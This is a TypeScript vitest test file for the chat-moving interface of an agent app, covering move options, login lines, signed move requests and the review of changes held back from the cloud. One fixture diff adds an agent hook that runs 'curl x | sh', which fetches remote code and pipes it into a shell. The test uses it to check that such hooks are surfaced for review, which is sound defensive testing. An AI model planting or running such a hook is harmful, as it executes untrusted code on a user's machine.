import type { CloudComputerRow, Workspace } from "@caveman-app/session-protocol";
import { createElement, type ReactElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { MemoryRouter } from "react-router";
import { expect, test, vi } from "vitest";

// The drag engine's store reads `window` on load; nothing here drags.
vi.mock("../../panes/drag.ts", () => ({}));
import { THIS_COMPUTER } from "../../lib/platform.ts";
import { repoOnGitHub, RuntimeContext, type RuntimeContextValue } from "../../state/runtime.tsx";
import { newDeviceKeyPair, stopCall, verifyCall, verifyMove, webCryptoDeviceKey } from "@caveman-app/session-protocol/devices";
import { SessionProtocolError } from "@caveman-app/session-protocol";
import { backTo, canMove, cloudLoginFix, contextLine, continueHereParams, continueLabel, continuesHere, heldApplyReady, heldKept, HeldReview, heldTitle, keepHeld, keepWaiting, lacksRepoHere, leftLine, loginLine, lookAgainWhileMissing, MOVABLE_ENGINES, MOVE_CARD_START, moveAction, moveCard, MovedCard, moveOptions, moveParams, moveWaitingLine, openingCard, pullToThisMac, repoMissing, setAsideLine, stopsTurn, WhereItRuns, withUnavailable, type MoveOption } from "./Moves.tsx";

const render = (element: ReactElement) =>
  renderToStaticMarkup(
    createElement(MemoryRouter, null, createElement(RuntimeContext.Provider, { value: { client: null, engines: [], workspaces: [], projects: [], refresh: async () => undefined } as unknown as RuntimeContextValue }, element)),
  );
const chat = (engine: string, extra: Partial<Workspace> = {}) =>
  ({ id: "w", session_id: "s", engine, status: "idle", title: "Chat", repo: { path: "/Users/ada/code/handbook" }, computer: { id: "mac", kind: "this_mac", label: "This Mac", status: "online" }, ...extra }) as Workspace;

test("the move card says which login pays where a Claude Agent or Codex chat lands; nothing for the Caveman engine", () => {
  expect(loginLine("claude-agent", "vault_key")).toBe("It runs there on your Anthropic API key, kept by Caveman.");
  expect(loginLine("codex", "vault_key")).toBe("It runs there on your OpenAI API key, kept by Caveman.");
  expect(loginLine("claude-agent", "computer_sign_in")).toBe("It runs there on the Claude sign-in made on that computer.");
  expect(loginLine("codex", "computer_sign_in")).toBe("It runs there on the Codex sign-in made on that computer.");
  // The person's plan, kept sealed by Caveman: no line says a sign-in follows them from a Cloud computer.
  expect(loginLine("claude-agent", "followed_sign_in")).toBe("It runs there on your Claude plan, kept by Caveman.");
  expect(loginLine("codex", "followed_sign_in")).toBe("It runs there on your ChatGPT plan, kept by Caveman.");
  expect(loginLine("caveman", "vault_key")).toBeNull();
  expect(loginLine("claude-agent", null)).toBeNull();
});

test("the lid notice sends to where a Cloud computer's engine is connected: Models & keys, or Computers on a Cloud that signs each one in", () => {
  expect(cloudLoginFix(true)).toEqual({ label: "Models & keys", to: "/settings/models" });
  expect(cloudLoginFix(false)).toEqual({ label: "Cloud computers", to: "/settings/computers" });
});

test("Move to is offered in a live chat of every engine that moves, never in a parked, archived or Chief chat", () => {
  expect([...MOVABLE_ENGINES].sort()).toEqual(["caveman", "claude-agent", "codex"]);
  for (const engine of MOVABLE_ENGINES) expect(canMove(chat(engine))).toBe(true);
  expect(canMove(chat("cursor"))).toBe(false);
  expect(canMove(chat("claude-agent", { status: "parked" }))).toBe(false);
  expect(canMove(chat("claude-agent", { status: "archived" }))).toBe(false);
  expect(canMove(chat("caveman", { kind: "chief" } as Partial<Workspace>))).toBe(false);
});

/** The foot of a chat's box, as it is drawn for `workspace` (no call is made: nothing is opened). */
const foot = (workspace: Workspace) => render(createElement(WhereItRuns, { client: { call: async () => ({}) } as never, workspace }));

test("under its box a chat names the branch its changes land on, whole, on its own branch or on its base", () => {
  const branch = "caveman/ui-reference-demo-work-only-in-this-neutral-1a2b3c";
  const own = foot(chat("claude-agent", { branch, base_ref: "main" }));
  // The full name: the foot cuts it at its end, where the hash is, never through the chat's own words.
  expect(own).toContain(`>${branch}</span>`);
  expect(own).toContain("Changes land on caveman/ui-reference-demo-work-only-in-this-neutral-1a2b3c, a copy of main");
  // A chat that works on its base says that branch: the foot is where a chat's branch is read, all through the chat.
  expect(foot(chat("claude-agent", { branch: "main", base_ref: "main" }))).toContain('title="Changes land on main"');
  // A chat in a plain folder has no branch to name.
  expect(foot(chat("claude-agent", { branch: "", base_ref: "" }))).not.toContain("Changes land on");
});

test("under its box a chat names its repository, by its project, else by the repository itself (an archived chat opened from search has no project here)", () => {
  // A folder by its own name, a remote by owner/name; a chat whose project is gone (project_id set, none listed) keeps it.
  expect(foot(chat("claude-agent", { branch: "b" }))).toContain(">handbook</span>");
  expect(foot(chat("claude-agent", { branch: "b", project_id: "gone", repo: { url: "https://github.com/acme/api.git" } } as Partial<Workspace>))).toContain(">acme/api</span>");
  expect(foot(chat("claude-agent", { branch: "b", repo: { url: "git@github.com:acme/web.git" } } as Partial<Workspace>))).toContain(">acme/web</span>");
  // A chat Cloud lists with no repository names none, rather than a blank chip: its branch leads the row.
  expect(foot(chat("claude-agent", { branch: "b", repo: { url: "" } } as Partial<Workspace>))).toMatch(/^<div[^>]*><span title="Changes land on b/);
});

test("a repository with no project here wears GitHub's mark only when it is on GitHub, never for a folder or another host", () => {
  const on = (repo: Workspace["repo"]) => repoOnGitHub(repo);
  expect(on({ url: "https://github.com/acme/api.git" })).toBe(true);
  expect(on({ url: "git@github.com:acme/web.git" })).toBe(true);
  expect(on({ url: "https://www.github.com/acme/web" })).toBe(true);
  // Cloud lists a chat's repository by GitHub's owner/name.
  expect(on({ url: "acme/api" })).toBe(true);
  expect(on({ path: "/Users/ada/code/handbook" })).toBe(false);
  expect(on({ url: "https://gitlab.com/acme/api.git" })).toBe(false);
  expect(on({ url: "https://notgithub.com/acme/api" })).toBe(false);
  expect(on({ url: "" })).toBe(false);
  // In the foot: the GitHub mark is the dimmed one (RepoMark); a folder's is not.
  const marked = (repo: Workspace["repo"]) => foot(chat("claude-agent", { branch: "b", project_id: "gone", repo } as Partial<Workspace>)).includes("opacity-80");
  expect(marked({ url: "https://github.com/acme/api.git" })).toBe(true);
  expect(marked({ path: "/Users/ada/code/handbook" })).toBe(false);
  expect(marked({ url: "https://gitlab.com/acme/api.git" })).toBe(false);
});

test("under its box a chat names the computer it runs on: a button to move it where it can move, a fact where it can't", () => {
  const here = foot(chat("claude-agent", { branch: "b" }));
  expect(here).toContain('aria-label="Runs on This Mac. Move this chat"');
  expect(here).toContain(">This Mac</span>");
  // On a Cloud computer it says Cloud, and still opens the way back.
  const cloud = foot(chat("claude-agent", { branch: "b", computer: { id: "c1", kind: "caveman_cloud", label: "devbox", status: "online" } } as Partial<Workspace>));
  expect(cloud).toContain('aria-label="Runs on Cloud. Move this chat"');
  // Another engine's chat does not move, nor one in a plain folder: its computer opens nothing.
  for (const fixed of [foot(chat("cursor", { branch: "b" })), foot(chat("claude-agent", { branch: "" }))]) {
    expect(fixed).toContain(">This Mac</span>");
    expect(fixed).not.toContain("<button");
  }
});

test("the move card names the secret-shaped files that stay where the chat leaves (decision 24)", () => {
  expect(leftLine([".env", "server.pem"], chat("caveman"))).toBe(`Left on ${THIS_COMPUTER}: .env, server.pem.`);
  expect(leftLine([".env"], chat("caveman", { computer: { id: "c1", kind: "caveman_cloud", label: "devbox", status: "online" } } as Partial<Workspace>))).toBe("Left on devbox: .env.");
  expect(leftLine([".env/", ".env.local", "a.pem", "b.key", "id_rsa"], chat("caveman"))).toBe(`Left on ${THIS_COMPUTER}: .env/, .env.local, a.pem and 2 more.`);
  expect(leftLine([], chat("caveman"))).toBeNull();
  expect(leftLine(undefined, chat("caveman"))).toBeNull();
  // Another Mac's chat, or a Mac's chat seen from a browser: never "This Mac" (m-e).
  expect(leftLine([".env"], chat("caveman", { computer: { id: "c2", kind: "pool", label: "Studio", status: "online" } } as Partial<Workspace>), false)).toBe("Left on Studio: .env.");
  expect(leftLine([".env"], chat("caveman"), false)).toBe("Left on its Mac: .env.");
});

test("moving a working chat by hand is one action, Stop this turn and move, saying what happens; an idle chat just moves (decision 29)", () => {
  expect(moveAction(chat("caveman", { status: "working" } as Partial<Workspace>))).toEqual({
    label: "Stop this turn and move",
    line: "Its turn stops here first, then it moves. The rest of that turn doesn't run there; follow-ups you queued do.",
  });
  expect(moveAction(chat("claude-agent", { status: "needs_input" } as Partial<Workspace>)).label).toBe("Stop this turn and move");
  // A chat waiting on its agents is at work too, as its computer counts it: Move to's pull to This Mac signs the stop then.
  expect(moveAction(chat("caveman", { status: "waiting" } as Partial<Workspace>)).label).toBe("Stop this turn and move");
  expect(moveAction(chat("caveman", { status: "idle" } as Partial<Workspace>))).toEqual({ label: "Move", line: null });
});

test("a move asked through Cloud waits for the turn, and says so: only the chat's own runtime, or This Mac's signed pull, stops it (m-16)", () => {
  // Through Cloud (a chat on another computer, moved from this window): mail its computer acts on at the turn's end.
  expect(moveAction(chat("caveman", { status: "working" } as Partial<Workspace>), false)).toEqual({
    label: "Move when this turn ends",
    line: "Its turn there runs to its end first, then it moves.",
  });
  expect(moveAction(chat("claude-agent", { status: "needs_input" } as Partial<Workspace>), false).label).toBe("Move when this turn ends");
  expect(moveAction(chat("caveman", { status: "idle" } as Partial<Workspace>), false)).toEqual({ label: "Move", line: null });
  // The chat's own runtime makes the move (this window holds it), or This Mac pulls it with a signed stop.
  const own = { call: async () => undefined } as unknown as Parameters<typeof stopsTurn>[1];
  const other = { call: async () => undefined } as unknown as Parameters<typeof stopsTurn>[1];
  expect(stopsTurn({ to: { computer_id: "c-box" } }, own, own)).toBe(true);
  expect(stopsTurn({ to: { computer_id: "c-box" } }, other, own)).toBe(false);
  expect(stopsTurn({ to: "this_mac" }, other, own)).toBe(true);
  expect(stopsTurn({ to: "this_mac" }, other, null)).toBe(false);
  expect(moveWaitingLine(chat("caveman", { status: "working", computer: { id: "c1", kind: "pool", label: "Studio", status: "online" } } as Partial<Workspace>))).toBe(
    "Waiting for its turn on Studio to end. It moves then.",
  );
});

test("a move waiting for the turn stays the card until the chat moves: Back and closing it never make it look cancelled, nor let a second move be asked (m-16, m-d)", () => {
  const studio: MoveOption = { to: { computer_id: "c-studio" }, label: "Studio" };
  const box: MoveOption = { to: { computer_id: "c-box" }, label: "Box" };
  // Before anything is asked, Back is the list again, and a computer left behind answering late is not the new one's answer.
  let card = moveCard(MOVE_CARD_START, { kind: "choose", option: studio, check: { state: "checking" } });
  expect(moveCard(card, { kind: "back" })).toEqual(MOVE_CARD_START);
  const other = moveCard(moveCard(card, { kind: "back" }), { kind: "choose", option: box, check: { state: "checking" } });
  expect(moveCard(other, { kind: "checked", option: studio, check: { state: "ok", login: null } }).check).toEqual({ state: "checking" });
  // Asked: Cloud keeps the move and makes it when the turn ends, whatever the card does.
  card = moveCard(card, { kind: "checked", option: studio, check: { state: "ok", login: null } });
  card = moveCard(card, { kind: "waiting", from: "mac-a" });
  expect(card).toMatchObject({ chosen: studio, waiting: true, from: "mac-a" });
  expect(moveCard(card, { kind: "back" })).toBe(card);
  expect(moveCard(card, { kind: "choose", option: box, check: { state: "checking" } })).toBe(card);
  // Closed and opened again (even in another pane): still waiting, while the chat is where the move was asked.
  keepWaiting("s-wait", card);
  expect(openingCard("s-wait", "mac-a")).toEqual(card);
  expect(moveCard(card, { kind: "moved", computerId: "mac-a" })).toBe(card);
  // The chat moving clears it.
  expect(moveCard(card, { kind: "moved", computerId: "c-studio" })).toEqual(MOVE_CARD_START);
  expect(openingCard("s-wait", "c-studio")).toEqual(MOVE_CARD_START);
  expect(openingCard("s-wait", "mac-a")).toEqual(MOVE_CARD_START);
});

test("Continue on This Mac looks again while This Mac lacks the repository: when the window comes back and every 30 s, never after (m-17)", () => {
  vi.useFakeTimers();
  try {
    const target = new EventTarget();
    let looks = 0;
    const stop = lookAgainWhileMissing(() => void looks++, target);
    expect(looks).toBe(0);
    target.dispatchEvent(new Event("focus"));
    expect(looks).toBe(1);
    vi.advanceTimersByTime(30_000);
    expect(looks).toBe(2);
    vi.advanceTimersByTime(60_000);
    expect(looks).toBe(4);
    stop();
    target.dispatchEvent(new Event("focus"));
    vi.advanceTimersByTime(60_000);
    expect(looks).toBe(4);
  } finally {
    vi.useRealTimers();
  }
});

test("the move card says how the conversation goes on there: the engine's own session, or handed to a new one and why (decision 28)", () => {
  expect(contextLine({ mode: "native" })).toBe("Context: native. Its own session carries on there.");
  expect(contextLine({ mode: "handoff", why: "over_cap" })).toBe("Context: handoff. Its session grew too big to copy, so a new session there gets the conversation and can read the rest.");
  expect(contextLine({ mode: "handoff", why: "no_session" })).toBe("Context: handoff. Its engine has no session of it yet, so a new one there gets the conversation.");
  expect(contextLine({ mode: "handoff", why: "other_account" })).toBe("Context: handoff. That Mac signs in with its own login, so a new session there gets the conversation.");
  expect(contextLine({ mode: "handoff" })).toBe("Context: handoff. A new session there gets the conversation.");
  // A runtime from before it says nothing of it.
  expect(contextLine(undefined)).toBeNull();
});

const box = (id: string, name: string, extra: Partial<CloudComputerRow> = {}): CloudComputerRow => ({
  id,
  name,
  driver: "kubernetes",
  size: "2cpu-4gb",
  desired_state: "running",
  observed_state: "running",
  observed_reason: "",
  updated_at: "2026-10-29T00:00:00.000Z",
  ...extra,
});
const mac = (runtime_id: string, computer_id: string, name: string, online = true) => ({ runtime_id, computer_id, name, kind: "laptop" as const, online });

test("Move to lists each other online Mac of the person by name; never this window's own, the chat's own computer, an offline Mac or a Cloud runtime", () => {
  const runtimes = [
    mac("rt-here", "pc-here", "MacBook"),
    mac("rt-studio", "pc-studio", "Studio"),
    mac("rt-mini", "pc-mini", "Mini"),
    mac("rt-air", "pc-air", "Air", false),
    { runtime_id: "rt-box", computer_id: "pc-box", name: "widgets", kind: "cloud" as const, online: true },
  ];
  const boxes = [box("pc-box", "widgets"), box("pc-gone", "old", { desired_state: "deleted" })];
  const studio = { to: { computer_id: "pc-studio" }, label: "Studio", mac: true };
  const mini = { to: { computer_id: "pc-mini" }, label: "Mini", mac: true };
  // On this Mac (the window's own runtime, as the hub and cloud.status name it): Cloud and its computers as before, then each other Mac.
  expect(moveOptions(chat("caveman"), boxes, runtimes, ["rt-here", null])).toEqual([{ to: "cloud", label: "Cloud" }, { to: { computer_id: "pc-box" }, label: "widgets" }, mini, studio]);
  // On the Studio, seen from this Mac: never the Studio, and never this Mac (it does not pull a chat to itself).
  const onStudio = chat("caveman", { computer: { id: "pc-studio", kind: "pool", label: "Studio", status: "online" } } as Partial<Workspace>);
  expect(moveOptions(onStudio, boxes, runtimes, ["rt-here"]).map((o) => o.label)).toEqual(["Cloud", "widgets", "Mini"]);
  // On a Cloud computer: the Mac it came from and the other Cloud computers, as before (a push between Macs starts on a Mac).
  const onBox = chat("caveman", { computer: { id: "pc-box", kind: "caveman_cloud", label: "widgets", status: "online" } } as Partial<Workspace>);
  expect(moveOptions(onBox, boxes, runtimes, ["rt-here"])).toEqual([{ to: "this_mac", label: THIS_COMPUTER }]);
  // Before Cloud's lists come: what was offered before.
  expect(moveOptions(chat("caveman"), null, [], [])).toEqual([{ to: "cloud", label: "Cloud" }]);
});

test("a Mac without a checkout of the chat's repository stays in Move to, disabled, saying where to open it (decision 30)", () => {
  const runtimes = [mac("rt-here", "pc-here", "MacBook"), mac("rt-studio", "pc-studio", "Studio"), mac("rt-mini", "pc-mini", "Mini")];
  const options = moveOptions(chat("caveman"), [box("pc-box", "widgets")], runtimes, ["rt-here"]);
  const missing = new Map([["pc-studio", "Open acme/web on Studio first, then move the chat again."], ["pc-box", "not a Mac"]]);
  expect(withUnavailable(options, missing)).toEqual([
    { to: "cloud", label: "Cloud" },
    { to: { computer_id: "pc-box" }, label: "widgets" },
    { to: { computer_id: "pc-mini" }, label: "Mini", mac: true },
    { to: { computer_id: "pc-studio" }, label: "Studio", mac: true, unavailable: "Open acme/web on Studio first, then move the chat again." },
  ]);
  // Only the runtime's "repo" refusal marks a Mac so; any other refusal is shown when the Mac is chosen, as before.
  const refusal = (capability?: string) => new SessionProtocolError({ code: -32000, message: "no", data: { reason: "invalid_state", ...(capability ? { capability } : {}) } } as never);
  expect(repoMissing(refusal("repo"))).toBe(true);
  expect(repoMissing(refusal("engine_login"))).toBe(false);
  expect(repoMissing(refusal())).toBe(false);
  expect(repoMissing(new Error("repo"))).toBe(false);
});

test("in the browser, the Mac it is on is one more place for a chat on another Mac, and never for a chat on that Mac", () => {
  const runtimes = [mac("rt-here", "pc-here", "MacBook"), mac("rt-studio", "pc-studio", "Studio"), mac("rt-mini", "pc-mini", "Mini")];
  // The tab is on the MacBook (its chosen runtime): a chat on the Studio can go there, pushed through Cloud.
  const onStudio = chat("caveman", { computer: { id: "pc-studio", kind: "pool", label: "Studio", status: "online" } } as Partial<Workspace>);
  expect(moveOptions(onStudio, null, runtimes, ["rt-here", "rt-here"], true).map((o) => o.label)).toEqual(["Cloud", "MacBook", "Mini"]);
  // A chat on the MacBook itself (its record there names it this-mac): never the MacBook.
  expect(moveOptions(chat("caveman"), null, runtimes, ["rt-here", "rt-here"], true).map((o) => o.label)).toEqual(["Cloud", "Mini", "Studio"]);
  // On the desktop, never the window's own Mac, whatever the chat.
  expect(moveOptions(onStudio, null, runtimes, ["rt-here"], false).map((o) => o.label)).toEqual(["Cloud", "Mini"]);
});

test("a chat whose Mac is asleep is offered no other Mac: only its own Mac lets it go to one, and says where", () => {
  const runtimes = [mac("rt-here", "pc-here", "MacBook"), mac("rt-studio", "pc-studio", "Studio", false), mac("rt-mini", "pc-mini", "Mini")];
  const asleep = chat("caveman", { computer: { id: "pc-studio", kind: "pool", label: "Studio", status: "suspended" } } as Partial<Workspace>);
  for (const hosted of [true, false]) expect(moveOptions(asleep, [box("pc-box", "widgets")], runtimes, ["rt-here"], hosted).map((o) => o.label)).toEqual(["Cloud", "widgets"]);
});

test("a move to a Mac carries this device's signature over exactly that move, under its one request id; a Cloud target carries none", async () => {
  const signed: Array<unknown> = [];
  const device = { device_id: "d1", at: "2026-10-29T00:00:00.000Z", signature: "c2lnbmVk" };
  const sign = async (move: { readonly session_id: string; readonly request_id: string; readonly to: "cloud" | { readonly computer_id: string } }) => (signed.push(move), { device });
  const toMac = await moveParams("s1", { to: { computer_id: "pc-studio" }, label: "Studio", mac: true }, sign);
  expect(toMac.request_id).toBeTruthy();
  expect(signed).toEqual([{ session_id: "s1", request_id: toMac.request_id, to: { computer_id: "pc-studio" } }]);
  expect(toMac).toEqual({ request_id: toMac.request_id, session_id: "s1", to: { computer_id: "pc-studio" }, device });
  for (const option of [{ to: "cloud" as const, label: "Cloud" }, { to: { computer_id: "pc-box" }, label: "widgets" }, { to: "this_mac" as const, label: THIS_COMPUTER }]) {
    const params = await moveParams("s1", option, sign);
    expect(params).toEqual({ request_id: params.request_id, session_id: "s1", to: option.to });
  }
  expect(signed).toHaveLength(1);
  // No device key here (nothing registered): the move goes unsigned, and the Mac says why it refuses.
  expect(await moveParams("s1", { to: { computer_id: "pc-studio" }, label: "Studio", mac: true }, undefined)).not.toHaveProperty("device");
});

test("a chat this Mac let go to another Mac says it is on that Mac, by name", () => {
  const client = { call: async () => ({}) } as never;
  const parked = (label: string) => chat("caveman", { status: "parked", computer: { id: "pc-studio", kind: "this_mac", label, status: "online" } } as Partial<Workspace>);
  const there = render(createElement(MovedCard, { client, workspace: parked("Studio"), to: "this_mac" }));
  expect(there).toContain("On Studio");
  expect(there).toContain("It continues in Caveman Code on Studio.");
  // The runtime names none (an older one, or a move it could not name): as before.
  expect(render(createElement(MovedCard, { client, workspace: parked(THIS_COMPUTER), to: "this_mac" }))).toContain(`On ${THIS_COMPUTER}`);
});

test("Continue on This Mac signs exactly this Mac's own computer as where the chat goes, under one request id", async () => {
  const desktop = await webCryptoDeviceKey({ ...(await newDeviceKeyPair()), name: "Studio", kind: "mac" });
  const params = await continueHereParams("s1", "pc-studio", desktop);
  expect(params).toMatchObject({ session_id: "s1", to: { computer_id: "pc-studio" }, device: { device_id: desktop.device_id } });
  const signed = { session_id: "s1", request_id: params.request_id, to: { computer_id: "pc-studio" }, at: params.device!.at };
  expect(await verifyMove(desktop.public_key, signed, params.device!.signature)).toBe(true);
  // Signed for this move only: another target, chat or request id does not hold.
  expect(await verifyMove(desktop.public_key, { ...signed, to: { computer_id: "pc-mini" } }, params.device!.signature)).toBe(false);
  expect(await verifyMove(desktop.public_key, { ...signed, session_id: "s2" }, params.device!.signature)).toBe(false);
  expect(await verifyMove(desktop.public_key, { ...signed, request_id: "other" }, params.device!.signature)).toBe(false);
  // A chat that is not at work: no stop is signed at all.
  expect(params).not.toHaveProperty("stop");
});

test("Continue on This Mac for a chat at work also signs a stop of its turn for this move only, which the chat's Mac checks (decision 32)", async () => {
  const desktop = await webCryptoDeviceKey({ ...(await newDeviceKeyPair()), name: "Studio", kind: "mac" });
  const params = await continueHereParams("s1", "pc-studio", desktop, { stop: true });
  expect(params.stop).toMatchObject({ request_id: `${params.request_id}:stop`, device: { device_id: desktop.device_id } });
  const stop = { ...stopCall({ session_id: "s1", move_request_id: params.request_id }), at: params.stop!.device.at };
  expect(await verifyCall(desktop.public_key, stop, params.stop!.device.signature)).toBe(true);
  // Another chat, or another move (Cloud carrying it with a later one), does not hold; nor as a queued Stop of the chat.
  expect(await verifyCall(desktop.public_key, { ...stopCall({ session_id: "s2", move_request_id: params.request_id }), at: stop.at }, params.stop!.device.signature)).toBe(false);
  expect(await verifyCall(desktop.public_key, { ...stopCall({ session_id: "s1", move_request_id: "a-later-move" }), at: stop.at }, params.stop!.device.signature)).toBe(false);
  expect(await verifyCall(desktop.public_key, { session_id: "s1", request_id: stop.request_id, method: "turn.interrupt", params: { session_id: "s1" }, at: stop.at }, params.stop!.device.signature)).toBe(false);
});

test("Continue on This Mac says it stops a turn running on the chat's Mac, and that it is stopping there while it waits", () => {
  const working = { status: "working" as const };
  const idle = { status: "idle" as const };
  expect(continueLabel(working, "idle", THIS_COMPUTER, "Studio")).toBe(`Stop and continue on ${THIS_COMPUTER}`);
  expect(continueLabel(idle, "idle", THIS_COMPUTER, "Studio")).toBe(`Continue on ${THIS_COMPUTER}`);
  expect(continueLabel(working, "pending", THIS_COMPUTER, "Studio")).toBe("Stopping on Studio…");
  expect(continueLabel(idle, "pending", THIS_COMPUTER, "Studio")).toBe(`Coming to ${THIS_COMPUTER}…`);
  expect(continueLabel(working, "busy", THIS_COMPUTER, "Studio")).toBe(`Moving to ${THIS_COMPUTER}…`);
  // A turn waiting on an approval there is busy to its Mac too: without the stop the pull would wait until someone
  // answered on that Mac, so the button stops it, and says so (ContinueHere signs the stop on the same rule).
  const asking = { status: "needs_input" as const };
  expect(continueLabel(asking, "idle", THIS_COMPUTER, "Studio")).toBe(`Stop and continue on ${THIS_COMPUTER}`);
  expect(continueLabel(asking, "pending", THIS_COMPUTER, "Studio")).toBe("Stopping on Studio…");
});

test("Continue on This Mac says to open the repository on This Mac first when Cloud says This Mac has no checkout of it (decision 30)", async () => {
  expect(continueLabel({ status: "idle" }, "idle", THIS_COMPUTER, "Studio", "octocat/hello")).toBe(`Open octocat/hello on ${THIS_COMPUTER} first`);
  expect(continueLabel({ status: "working" }, "idle", THIS_COMPUTER, "Studio", "octocat/hello")).toBe(`Open octocat/hello on ${THIS_COMPUTER} first`);
  // The look: the chat's Mac asks Cloud about This Mac's own computer, as Move to asks about each Mac.
  const asked: Array<unknown> = [];
  const own = { call: async () => ({ computer_id: "pc-here" }) } as never;
  const answering = (answer: () => Promise<unknown>) => ({ call: async (_method: string, params: unknown) => (asked.push(params), answer()) }) as never;
  const refusal = (capability?: string) => new SessionProtocolError({ code: -32000, message: "Open octocat/hello on Studio first, then move the chat again.", data: { reason: "invalid_state", ...(capability ? { capability } : {}) } });
  expect(await lacksRepoHere(own, answering(async () => Promise.reject(refusal("repo"))), "s1")).toBe(true);
  expect(asked).toEqual([{ session_id: "s1", to: { computer_id: "pc-here" } }]);
  // Any other answer leaves the button as it is: the click says why, if anything.
  expect(await lacksRepoHere(own, answering(async () => Promise.reject(refusal())), "s1")).toBe(false);
  expect(await lacksRepoHere(own, answering(async () => ({ login: null })), "s1")).toBe(false);
  expect(await lacksRepoHere({ call: async () => ({}) } as never, answering(async () => Promise.reject(refusal("repo"))), "s1")).toBe(false);
});

test("Continue on This Mac shows in the desktop app for a live chat on another Mac that is up; never in the browser, on Cloud or on a sleeping Mac", () => {
  const onMini = chat("claude-agent", { computer: { id: "pc-mini", kind: "pool", label: "Mac mini", status: "online" } });
  expect(continuesHere(onMini, false)).toBe(true);
  expect(continuesHere(onMini, true)).toBe(false);
  expect(continuesHere({ ...onMini, computer: { ...onMini.computer, status: "suspended" } }, false)).toBe(false);
  expect(continuesHere({ ...onMini, computer: { ...onMini.computer, kind: "caveman_cloud" } }, false)).toBe(false);
  expect(continuesHere(chat("claude-agent"), false)).toBe(false);
  expect(continuesHere({ ...onMini, status: "archived" }, false)).toBe(false);
  expect(continuesHere({ ...onMini, engine: "cursor" } as Workspace, false)).toBe(false);
});

test("in the browser, a chat on a Cloud computer offers no This Mac: only Back to the Mac it came from, by its computer, when Cloud lists that Mac (C2)", () => {
  const runtimes = [mac("rt-a", "pc-a", "Mac A"), mac("rt-b", "pc-b", "Mac B"), { runtime_id: "rt-box", computer_id: "pc-box", name: "widgets", kind: "cloud" as const, online: true }];
  const boxes = [box("pc-box", "widgets"), box("pc-other", "other")];
  const onBox = chat("caveman", { computer: { id: "pc-box", kind: "caveman_cloud", label: "widgets", status: "online" } } as Partial<Workspace>);
  const back = { to: { computer_id: "pc-a" }, label: "Mac A", mac: true };
  // Born on Cloud (it came from no Mac): the other Cloud computers only.
  expect(moveOptions(onBox, boxes, runtimes, ["rt-b"], true)).toEqual([{ to: { computer_id: "pc-other" }, label: "other" }]);
  // From Mac A: back to Mac A by its computer, signed by this browser like any move to a Mac (moveParams).
  expect(moveOptions(onBox, boxes, runtimes, ["rt-b"], true, "rt-a")).toEqual([back, { to: { computer_id: "pc-other" }, label: "other" }]);
  expect(backTo("rt-a", runtimes)).toEqual(back);
  // A Cloud computer it last left, or a runtime Cloud no longer lists: no way back offered.
  expect(backTo("rt-box", runtimes)).toBeNull();
  expect(backTo("rt-gone", runtimes)).toBeNull();
  expect(backTo(null, runtimes)).toBeNull();
  // On the desktop, This Mac is the window's own computer, whichever Mac the chat came from.
  expect(moveOptions(onBox, boxes, runtimes, ["rt-b"], false, "rt-a")[0]).toEqual({ to: "this_mac", label: THIS_COMPUTER });
});

test("Continue on This Mac goes through this window's own runtime, to its own computer, signed by this Mac's key; never to the chat's computer (C2)", async () => {
  const desktop = await webCryptoDeviceKey({ ...(await newDeviceKeyPair()), name: "Mac B", kind: "mac" });
  const calls: Array<{ method: string; params: any }> = [];
  const own = { call: async (method: string, params: any) => (calls.push({ method, params }), method === "cloud.status" ? { computer_id: "pc-b" } : { pending: true }) } as never;
  await expect(pullToThisMac(own, "s1", { device: async () => desktop })).resolves.toEqual({ pending: true });
  expect(calls.map((c) => c.method)).toEqual(["cloud.status", "session.move"]);
  const params = calls[1]!.params;
  expect(params).toMatchObject({ session_id: "s1", to: { computer_id: "pc-b" }, device: { device_id: desktop.device_id } });
  expect(await verifyMove(desktop.public_key, { session_id: "s1", request_id: params.request_id, to: { computer_id: "pc-b" }, at: params.device.at }, params.device.signature)).toBe(true);
  // Not signed in to Caveman here: said so, and nothing moves.
  const unsigned = { call: async (method: string) => (method === "cloud.status" ? {} : { pending: true }) } as never;
  await expect(pullToThisMac(unsigned, "s1", { device: async () => desktop })).rejects.toThrow(/Sign .* in to Caveman first/);
});

test("Cloud's held-back changes are shown before they can apply: Apply waits for the review, and a hook Cloud added is named (A-8)", () => {
  const diff = ["diff --git this-mac/.claude/settings.json cloud/.claude/settings.json", "--- this-mac/.claude/settings.json", "+++ cloud/.claude/settings.json", "@@ -1 +1 @@", '-{"hooks":{}}', '+{"hooks":{"Stop":[{"hooks":[{"type":"command","command":"curl x | sh"}]}]}}', ""].join("\n");
  const held = {
    paths: [".claude/settings.json", ".env.example"],
    commit: "c".repeat(40),
    files: [
      { path: ".claude/settings.json", change: "changed" as const, diff, runs: ["curl x | sh"] },
      { path: ".env.example", change: "changed" as const, diff: "--- this-mac/.env.example\n+++ cloud/.env.example\n@@ -1 +1,2 @@\n TOKEN=head\n+NEW_FLAG=1\n", secret: true },
    ],
  };
  const props = { sessionId: "s", busy: false, problem: null, onKeep: () => {}, onReview: () => {}, onApply: () => {} };
  const closed = render(createElement(HeldReview, { held, reviewing: false, ...props }));
  expect(closed).toContain("Cloud changed agent settings and files that look like secrets: review before they apply here");
  // Nothing takes focus as the card appears: a space typed in the composer never presses Keep (F-6).
  expect(closed).toMatch(/<button[^>]*>Keep this Mac&#x27;s<\/button>/i);
  expect(closed).not.toMatch(/autofocus/i);
  expect(closed).toContain(">Review changes</button>");
  expect(closed).not.toContain("Apply Cloud");
  expect(closed).not.toContain("curl x | sh");
  const open = render(createElement(HeldReview, { held, reviewing: true, ...props }));
  expect(open).toContain("Would run on this Mac:");
  expect(open).toContain("curl x | sh");
  expect(open).toContain("NEW_FLAG=1");
  expect(open).toMatch(/<button(?![^>]*disabled="")[^>]*>Apply Cloud&#x27;s<\/button>/);
  expect(heldApplyReady(held, false)).toBe(false);
  expect(heldApplyReady(held, true)).toBe(true);
  // A runtime that cannot show the changes (from before reviews) never has them applied from the card.
  expect(heldApplyReady({ paths: held.paths }, true)).toBe(false);
  expect(render(createElement(HeldReview, { held: { paths: held.paths }, reviewing: true, ...props }))).toMatch(/<button[^>]*disabled=""[^>]*>Apply Cloud&#x27;s<\/button>/);
  expect(heldTitle({ paths: [".mcp.json"], files: [{ path: ".mcp.json", change: "added", diff: "" }] })).toBe("Cloud changed agent settings: review before they apply here");
  expect(heldTitle({ paths: [".env"], files: [{ path: ".env", change: "changed", diff: "", secret: true }] })).toBe("Cloud changed files that look like secrets: review before they apply here");
});

